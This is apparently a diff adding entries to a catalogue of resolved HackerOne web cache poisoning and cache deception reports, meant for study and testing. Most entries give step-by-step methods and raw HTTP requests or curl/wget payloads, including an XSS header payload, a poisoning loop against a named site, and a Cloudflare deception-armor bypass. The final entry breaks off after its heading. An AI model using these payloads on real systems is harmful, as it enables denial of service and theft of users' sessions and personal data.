+<h4>Method</h4><ol><li>Send a request padded with 94+ junk headers</li><li>After the overflow, append a header that is normally part of the cache key (e.g. X-HTTP-Method-Override) or one carrying an XSS/attack payload (User-Agent)</li><li>Cache Rules / custom + default cache keys and WAF managed rules no longer evaluate the trailing header</li><li>Poison the cache so the malicious/incorrect response is served to other users, or reach origin uninspected</li></ol>
+<div class="pre">GET /path HTTP/1.1
+Host: victim.com
+1: 1
+1: 1
+... (&gt;=94 padding headers) ...
+1: 1
+User-Agent: &lt;/script&gt;&lt;svg onload=alert(1)&gt;</div>
+<p class="insight"><b>Insight —</b> Header/parameter parser limits are a differential-analysis goldmine: if a security layer and the cache/origin disagree on how many headers get parsed, pad past the limit to smuggle an unkeyed or uninspected header. Watch for http.request.headers.truncated as a tell.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3027461" target="_blank" rel="noopener">hackerone.com/reports/3027461</a></span><a class="src" href="#report-3027461" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1183263" style="--sv:var(--sev-high)" data-sev="3" data-votes="36" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache-poisoned DoS (CPDoS) via oversized/malformed request</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1183263</b> · deptofdefense · none · 36 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A caching layer stores the response to a malformed/oversized request (e.g. an enormous header value producing an error/oversized response) under a normal cache key, then serves that broken response to all subsequent users of that key.</p>
+<h4>Method</h4><ol><li>Add a cache-buster to the path to isolate a cache key</li><li>Send a request with a malformed/huge header value that yields an error or oversized response</li><li>Confirm the response is cached (X-Cache / repeated identical response)</li><li>Request the same resource normally and observe the poisoned/broken response served to everyone</li></ol>
+<div class="pre">GET /page?cb=1 HTTP/1.1
+Host: www.target
+yeetheadertest1: AAAAAAAA...(thousands of A's to force an error/oversized response)...</div>
+<p class="insight"><b>Insight —</b> Test caches by forcing an error or oversized response and checking if it gets cached. Remediation is to never cache error status codes. Complements keyed-header poisoning (see 1010858).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1183263" target="_blank" rel="noopener">hackerone.com/reports/1183263</a></span><a class="src" href="#report-1183263" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-728664" style="--sv:var(--sev-high)" data-sev="3" data-votes="25" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CPDoS via X-CF-APP-INSTANCE header forcing cached 404</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#728664</b> · gsa_bbp · awarded · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_bbp</b></span><span>Surface <b>web</b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Cloud Foundry gorouter debug header (X-CF-APP-INSTANCE) with a bad value forces a 404, and if the app sits behind a caching CDN that caches error responses, the poisoned 404 is served to other users (Cache-Poisoned DoS).</p>
+<h4>Method</h4><ol><li>Pick a cacheable resource on a CDN-fronted app; add a cache-buster query (?cb=xxx)</li><li>Send a request with a malformed X-CF-APP-INSTANCE header to force a gorouter 404</li><li>Repeat until the CDN caches the 404</li><li>Confirm as an uncookied/new user (private window or curl) that the resource now returns 404</li></ol>
+<div class="pre">GET /?cb=xxx HTTP/1.1
+Host: TARGET
+X-CF-APP-INSTANCE: xxx:1
+Connection: close</div>
+<p class="insight"><b>Insight —</b> Any request header that reliably triggers an error status can become a DoS when the front cache stores error responses; test provider-specific debug/routing headers (X-CF-APP-INSTANCE, X-Amz-*, oversized headers) and check whether 4xx get cached and keyed only on URL, not cookies.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/728664" target="_blank" rel="noopener">hackerone.com/reports/728664</a></span><a class="src" href="#report-728664" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-429747" style="--sv:var(--sev-high)" data-sev="3" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache poisoning via unkeyed X-Forwarded-Host</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#429747</b> · nextcloud · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>unkeyed header reflection -&gt; cache poisoning -&gt; stored</b></span></div>
+<h4>Root cause</h4><p style="margin:0">X-Forwarded-Host is reflected into responses but is not part of the cache key (unkeyed input). An attacker can poison a cached page so it points resource URLs at an attacker-controlled host, enabling stored XSS / malware delivery to all subsequent visitors.</p>
+<h4>Method</h4><ol><li>Pick a URL with a cache-buster query param</li><li>Repeatedly request it with X-Forwarded-Host: attacker.tld/# until cached</li><li>Fetch the URL normally and grep for the attacker host in the response to confirm the poison</li></ol>
+<div class="pre">while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO- &gt;/dev/null; done
+# confirm:
+wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO- | grep cyberjutsu.io</div>
+<p class="insight"><b>Insight —</b> Send X-Forwarded-Host / X-Forwarded-Scheme / X-Host and check if the value is reflected AND cached without being in the cache key. Use a unique query param as a private cache-buster so you poison your own key first while testing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/429747" target="_blank" rel="noopener">hackerone.com/reports/429747</a></span><a class="src" href="#report-429747" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-291012" style="--sv:var(--sev-high)" data-sev="3" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cached infinite redirect loop -&gt; persistent DoS via crafted path</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#291012</b> · owox · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>owox</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A crafted URL (double-slash + encoded traversal) triggers a server-side 301 that keeps appending a trailing slash, producing an infinite redirect loop; because the redirect is cached/served to everyone, the whole site becomes inaccessible.</p>
+<h4>Method</h4><ol><li>Request the site with //host-like path + encoded traversal (%2e%2e%2f)</li><li>Server responds 301 to a URL that will itself 301 again (loop)</li><li>Response is cached -&gt; all subsequent visitors hit the loop -&gt; DoS</li></ol>
+<div class="pre">GET http://my.dev.owox.com//www.google.com/%2e%2e%2f
+-&gt; 301 Location: //www.google.com/%2e%2e%2f/  (loops)</div>
+<p class="insight"><b>Insight —</b> Path-normalization + redirect logic that re-appends slashes can create self-referential 301s; if a shared cache/proxy stores it, one request denies service to everyone. Test normalization edge cases (//, /%2e%2e%2f, encoded traversal) and whether the bad response is cached.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/291012" target="_blank" rel="noopener">hackerone.com/reports/291012</a></span><a class="src" href="#report-291012" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-824753" style="--sv:var(--sev-high)" data-sev="3" data-votes="14" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache-key confusion via URL userinfo decoding (Squid poisoning)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#824753</b> · ibb · awarded · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>encoded userinfo -&gt; shared cache key -&gt; attacker conte</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Squid URL-decoded the userinfo portion (before @) and included the decoded string in the absolute URL used to build the cache key, so two requests for different real hosts could produce the same key - letting an attacker's server response be cached and served for a trusted domain.</p>
+<h4>Method</h4><ol><li>Run a request whose userinfo encodes delimiters so it decodes to the victim URL, pointing the real host at your server</li><li>Your response is cached under the victim's effective key</li><li>A genuine request for the victim domain hits the poisoned cache entry (X-Cache: HIT)</li></ol>
+<div class="pre">GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1
+# later real: GET ftp://hackerone.com/?@192.168.122.1:8080/payload -&gt; HIT
+# HTTPS variant: GET https://hackerone.com%2f%3f@ATTACKER:8080/html/alert.html</div>
+<p class="insight"><b>Insight —</b> Cache-key generation that decodes/normalizes URL parts (userinfo, %2f, %3f, #) differently from routing is a poisoning primitive; craft userinfo whose decoded form collides with the target's key. Test proxies/CDNs for encoded-delimiter cache-key confusion.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/824753" target="_blank" rel="noopener">hackerone.com/reports/824753</a></span><a class="src" href="#report-824753" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1322732" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CPDoS: unkeyed Host-header port poisons cached 301</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1322732</b> · deptofdefense · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The cache stores a 301 redirect that reflects an attacker-supplied port from the Host header; because the port is unkeyed, a poisoned redirect is served to all users of that path, and a cache-buster query param lets the attacker poison arbitrary paths -&gt; persistent DoS.</p>
+<h4>Method</h4><ol><li>Add a unique cache-buster param to a cacheable URL (e.g. &amp;CPDoS=1)</li><li>Send the request with a bogus port appended to the Host header (Host: victim:1234)</li><li>The 301 reflects and caches the bad port; remove the port and resend -&gt; still reflected = poisoned; the path now fails to load for everyone</li><li>Loop with Intruder to keep re-poisoning after TTL</li></ol>
+<div class="pre">GET /somepath?CPDoS=1 HTTP/1.1
+Host: TARGET:1234
+# response is a 301 reflecting :1234, cached and served to all users</div>
+<p class="insight"><b>Insight —</b> Web-cache-poisoning DoS: find inputs the cache doesn't key on but the origin reflects (Host/port, X-Forwarded-Host/-Scheme/-Port). 301/redirect responses reflecting the Host are prime; add a unique query param to safely poison a single path during testing, then generalize. Re-test old fixes that only patched one path.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1322732" target="_blank" rel="noopener">hackerone.com/reports/1322732</a></span><a class="src" href="#report-1322732" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1198434" style="--sv:var(--sev-high)" data-sev="3" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache-poisoned DoS via unkeyed Host header/port reflected in a 301</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1198434</b> · deptofdefense · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>host-header reflection -&gt; web cache poisoning -&gt; denia</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An origin reflects the Host header (domain/port) into a 301 redirect, and the cache stores that response keyed only by path; injecting a bogus port poisons the cached redirect so every user hitting that path is redirected to a dead host:port - CPDoS.</p>
+<h4>Method</h4><ol><li>Find a path that 301-redirects and reflects the Host/port in the Location</li><li>Send the request with an added random URL param (to scope the poison to that path) and a bogus port in the Host header</li><li>Server 301s reflecting the bad port; resend to confirm the cache now serves the poisoned redirect to everyone</li><li>Drop the random param to poison the bare path</li></ol>
+<div class="pre">GET /somepath?CPDoS=1 HTTP/1.1
+Host: www.TARGET:1234
+
+# response 301 reflects port 1234 in Location; once cached, all users get the dead redirect</div>
+<p class="insight"><b>Insight —</b> During SSRF/host-header testing watch for the Host (or X-Forwarded-Host/-Port/-Scheme) leaking into a cached response. If the cache key excludes that header, you have web-cache-poisoning DoS. Scope experiments to a throwaway ?param path first so you can test responsibly before hitting the bare route.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1198434" target="_blank" rel="noopener">hackerone.com/reports/1198434</a></span><a class="src" href="#report-1198434" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-622122" style="--sv:var(--sev-med)" data-sev="2" data-votes="850" data-bounty="9700">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache-poisoning DoS via malformed Transfer-Encoding</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#622122</b> · paypal · 9700 · 850 votes · resolved</div>
+<div class="taxo"><span>Program <b>paypal</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unkeyed request feature (invalid Transfer-Encoding header) causes the origin/CDN to cache an error response ('501 Not Implemented') in place of legitimate JavaScript, denying it to all users.</p>
+<h4>Method</h4><ol><li>Identify a cached static asset (JS from a CDN host like paypalobjects.com)</li><li>Send a request with an invalid Transfer-Encoding header that the origin errors on but the cache still stores</li><li>Confirm the cached 501 is served to normal requests for that asset</li></ol>
+<div class="pre">GET /js/app.js HTTP/1.1
+Host: www.paypalobjects.com
+Transfer-Encoding: invalid</div>
+<p class="insight"><b>Insight —</b> Any header that changes the origin response but is NOT part of the cache key is a cache-poisoning DoS primitive. Malformed hop-by-hop headers (Transfer-Encoding) reliably force error responses that then get cached and starve real content.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/622122" target="_blank" rel="noopener">hackerone.com/reports/622122</a></span><a class="src" href="#report-622122" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-591302" style="--sv:var(--sev-med)" data-sev="2" data-votes="405" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS cache poisoning DoS (Origin reflected into ACAO)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#591302</b> · automattic · awarded · 405 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WP-JSON echoes the request Origin into Access-Control-Allow-Origin, and the CDN caches that response without keying on Origin. The poisoned ACAO (attacker's origin) is served to real cross-origin consumers, whose browsers then block the response -&gt; CORS-based DoS.</p>
+<h4>Method</h4><ol><li>Confirm the JSON endpoint reflects Origin into ACAO and is cached (X-Cache: hit)</li><li>From any HTTPS page, fetch the endpoint 5-10 times to poison all cache backends</li><li>From a different origin, fetch again and observe the browser CORS error blocking the response</li></ol>
+<div class="pre">fetch('https://TARGET/wp-json/?cachebuster1').then(r=&gt;r.json())
+// sent with Origin: https://attacker.example so ACAO is poisoned to attacker's origin</div>
+<p class="insight"><b>Insight —</b> Reflected-Origin CORS + shared cache = DoS for any legitimate cross-origin (subdomain/headless) consumer. Detect by sending an Origin header and checking if it appears in a cacheable ACAO response.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/591302" target="_blank" rel="noopener">hackerone.com/reports/591302</a></span><a class="src" href="#report-591302" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1695604" style="--sv:var(--sev-med)" data-sev="2" data-votes="264" data-bounty="3800">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CDN cache poisoning DoS via backslash/forward-slash normalization mismatch</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1695604</b> · shopify · USD 3800 · 264 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>cdn</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The cache layer normalizes backslashes to forward slashes when computing the cache key, but the origin serves 404 for paths containing backslashes. The two systems therefore agree on the cache key but disagree on the response, so a 404 gets stored under the legitimate asset's key.</p>
+<h4>Method</h4><ol><li>Pick any cached static asset URL on the CDN (e.g. a JS bundle on cdn.shopify.com).</li><li>Replace the forward slashes in the path with backslashes and append a cache-buster query param so testing does not DoS real users.</li><li>Send the malformed request repeatedly (Repeater/Intruder) until the 404 response is cached under that key.</li><li>Request the normal URL (with the same cache-buster) and observe the cached 404 served instead of the asset.</li></ol>
+<div class="pre">GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
+Host: cdn.shopify.com
+Connection: close</div>
+<p class="insight"><b>Insight —</b> When a cache and origin disagree on path normalization (backslash vs slash, trailing dot, case, encoded chars), you can cache an error page under a valid resource's key for a self-inflicted DoS. Diff how the edge vs origin canonicalize the path; any char one collapses and the other rejects is a poisoning primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1695604" target="_blank" rel="noopener">hackerone.com/reports/1695604</a></span><a class="src" href="#report-1695604" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-409370" style="--sv:var(--sev-med)" data-sev="2" data-votes="253" data-bounty="2500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>X-Forwarded-Port/Host cache poisoning to dead port</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#409370</b> · security · 2500 · 253 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app builds redirect Location URLs from unkeyed X-Forwarded-Port/X-Forwarded-Host headers; poisoning the cache with a bad port makes every redirect point to a dead port, persistently blocking access.</p>
+<h4>Method</h4><ol><li>Find a cached endpoint that issues a redirect</li><li>Send a request with X-Forwarded-Port set to a closed port (or X-Forwarded-Host: host:badport)</li><li>Load the URL normally and observe the cached redirect to the dead port</li></ol>
+<div class="pre">curl -H 'X-Forwarded-Port: 123' 'https://TARGET/index.php?cb=1'
+curl -H 'X-Forwarded-Host: TARGET:123' 'https://TARGET/index.php?cb=1'</div>
+<p class="insight"><b>Insight —</b> X-Forwarded-* headers are classic unkeyed cache-poisoning inputs. If they influence redirect targets or absolute URLs, a bad port/host is a persistent availability kill. Always test them with a cache-buster first.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/409370" target="_blank" rel="noopener">hackerone.com/reports/409370</a></span><a class="src" href="#report-409370" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1181946" style="--sv:var(--sev-med)" data-sev="2" data-votes="228" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache poisoning at scale via unkeyed header -&gt; cached redirect/error on static files</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1181946</b> · security · awarded · 228 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>cloud-azure</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unkeyed header (x-forwarded-scheme) makes the origin emit a 301 redirect loop that Cloudflare caches for a static JS/CSS/image file; the poisoned entry is served to everyone, taking down assets and any page that depends on them.</p>
+<h4>Method</h4><ol><li>Pick a cached static asset (append ?cb=poc cache-buster)</li><li>Send GET with x-forwarded-scheme: http and observe a 301 to the same URL</li><li>Remove the header and confirm the cached 301/redirect-loop is now served</li><li>On the real file (no cache-buster) this makes the asset permanently unavailable</li></ol>
+<div class="pre">GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2
+Host: hackerone.com
+x-forwarded-scheme: http</div>
+<p class="insight"><b>Insight —</b> Behind CDNs, protocol/scheme headers (x-forwarded-scheme, x-forwarded-proto) frequently trigger cacheable redirects. Taking down one shared JS chunk = total loss of availability. Enumerate every unkeyed header against cached assets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1181946" target="_blank" rel="noopener">hackerone.com/reports/1181946</a></span><a class="src" href="#report-1181946" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1096609" style="--sv:var(--sev-med)" data-sev="2" data-votes="81" data-bounty="2900">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Host-header port cache poisoning -&gt; broken assets DoS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1096609</b> · shopify · 2900 · 81 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app reflects the Host header (including an arbitrary port) into cached absolute URLs (canonical link, asset/link hrefs); poisoning the cache with a closed port makes all those URLs point to a dead port, so images/CSS/links fail to load.</p>
+<h4>Method</h4><ol><li>Request a cached page with Host set to host:closedport (use a query cache-buster while testing)</li><li>Confirm the response body reflects host:closedport in canonical/asset URLs</li><li>Fetch the page normally and observe the poisoned port served to everyone -&gt; broken page</li></ol>
+<div class="pre">curl -ik 'https://themes.shopify.com/?cb=1' -H 'Host: themes.shopify.com:1337'</div>
+<p class="insight"><b>Insight —</b> When Host (with port) is reflected into absolute URLs that get cached, a bad port is a persistent asset/link DoS. Related to X-Forwarded-* port poisoning; always test the raw Host header too, not just XF headers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1096609" target="_blank" rel="noopener">hackerone.com/reports/1096609</a></span><a class="src" href="#report-1096609" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1219038" style="--sv:var(--sev-med)" data-sev="2" data-votes="77" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cache-poisoning DoS via unkeyed 'trailer' header forcing a cached 400</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1219038</b> · rockstargames · awarded · 77 votes · resolved</div>
+<div class="taxo"><span>Program <b>rockstargames</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unkeyed request header (trailer) makes the origin return a 400 while the CDN caches that error response against the normal cache key, so subsequent legitimate users are served the cached 400 (denial of service).</p>
+<h4>Method</h4><ol><li>Add a cache-buster query param to target a specific cached URL</li><li>Send the request with the malformed/unkeyed header 'trailer: 1' to trigger a 400</li><li>The CDN caches the 400 under the URL key</li><li>Legit users requesting that URL now get the poisoned 400</li></ol>
+<div class="pre">GET /patches/.../notes.txt?donotpoisoneveryone=1 HTTP/1.1
+Host: updates.rockstargames.com
+trailer: 1</div>
+<p class="insight"><b>Insight —</b> Hunt cache-poisoning DoS by fuzzing unkeyed headers (X-Forwarded-Host/-Scheme, trailer, oversized/odd headers) that make the origin error, then confirm the error is cached under the shared key. Use a unique cache-buster to avoid poisoning real users during testing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1219038" target="_blank" rel="noopener">hackerone.com/reports/1219038</a></span><a class="src" href="#report-1219038" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-631589" style="--sv:var(--sev-med)" data-sev="2" data-votes="45" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache deception via static-extension path on authenticated page</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#631589</b> · lyst · awarded · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>lyst</b></span><span>Surface <b>web</b></span><span>Chain <b>cache deception -&gt; PII/session data disclosure (email, me</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Appending a static-looking extension (e.g. .css) to an authenticated URL made the CDN/cache treat the personalized (logged-in) response as a cacheable static asset, storing a victim's PII/session-reflected page for any unauthenticated visitor to retrieve.</p>
+<h4>Method</h4><ol><li>As a logged-in victim, request an authenticated page with a static extension appended to the path</li><li>The cache stores the personalized response keyed on the static-looking URL</li><li>As an unauthenticated attacker (even in private mode) request the same URL and read the victim's data</li></ol>
+<div class="pre">https://TARGET/shop/trends/mens-dress-shoes/anything.css
+# personalized (logged-in) HTML gets cached and served to others</div>
+<p class="insight"><b>Insight —</b> Test cache deception on any personalized page: append /nonexistent.css, .js, .jpg (and path-param variants). If the response still contains user data and is cached, unauthenticated users can harvest it. Check for missing/incorrect Cache-Control and cache-key normalization.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/631589" target="_blank" rel="noopener">hackerone.com/reports/631589</a></span><a class="src" href="#report-631589" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-504514" style="--sv:var(--sev-med)" data-sev="2" data-votes="39" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache poisoning via unkeyed X-Forwarded-Host</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#504514</b> · smule · none · 39 votes · resolved</div>
+<div class="taxo"><span>Program <b>smule</b></span><span>Surface <b>web</b></span><span>Chain <b>unkeyed header reflection -&gt; cache poisoning -&gt; victim</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app reflected the X-Forwarded-Host header into generated action/footer/form links, and the cache did not key on that header, so a poisoned response (links rewritten to an attacker host) was cached and served to other users, redirecting their form posts (and CSRF tokens/credentials) to the attacker.</p>
+<h4>Method</h4><ol><li>Send a request adding X-Forwarded-Host: attacker.tld and confirm the response's action/form/asset links now point to attacker.tld</li><li>Confirm the poisoned response is cached (served to other clients on the same key)</li><li>Host a server mimicking the endpoint's response/CORS so victim form posts deliver credentials/CSRF token to you</li></ol>
+<div class="pre">GET /s/smule_groups/user_groups/USER HTTP/1.1
+Host: www.TARGET.com
+X-Forwarded-Host: localhost   # links in response rewritten to this host</div>
+<p class="insight"><b>Insight —</b> Probe unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme, X-Host, X-Forwarded-For) for reflection into links/redirects/absolute URLs, then check cacheability. If reflected and cached, you poison other users' pages to steal CSRF tokens/credentials on login.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/504514" target="_blank" rel="noopener">hackerone.com/reports/504514</a></span><a class="src" href="#report-504514" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1391635" style="--sv:var(--sev-med)" data-sev="2" data-votes="36" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Bypassing Cloudflare Cache Deception Armor with .avif extension</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1391635</b> · cloudflare · awarded · 36 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Tag <b>cdn</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Cloudflare's Cache Deception Armor page rule (which is meant to only cache a URL when the origin Content-Type matches the extension) did not account for the .avif image extension, so a path-confused URL ending in .avif was cached even when the response was dynamic/sensitive.</p>
+<h4>Method</h4><ol><li>Identify an origin behind Cloudflare with Cache Deception Armor enabled.</li><li>Craft a path-confusion URL on a sensitive authenticated endpoint ending in a .avif extension.</li><li>Lure an authenticated victim to open it so the edge caches their sensitive (normally non-cacheable) response.</li><li>Retrieve the cached content from Cloudflare's edge anonymously.</li></ol>
+<div class="pre">https://TARGET/&lt;authenticated-path&gt;/&lt;random&gt;.avif</div>
+<p class="insight"><b>Insight —</b> Protection layers that whitelist 'safe' static extensions lag behind new image/media formats. When a WCD armor blocks .css/.js/.png, retry newer or obscure extensions (.avif, .webp, .heic, .jxl, .woff2) that the rule's Content-Type map may not cover. Impact scales with what the customer origin reflects (session -&gt; ATO, XSS -&gt; stored XSS).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1391635" target="_blank" rel="noopener">hackerone.com/reports/1391635</a></span><a class="src" href="#report-1391635" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-334709" style="--sv:var(--sev-med)" data-sev="2" data-votes="32" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
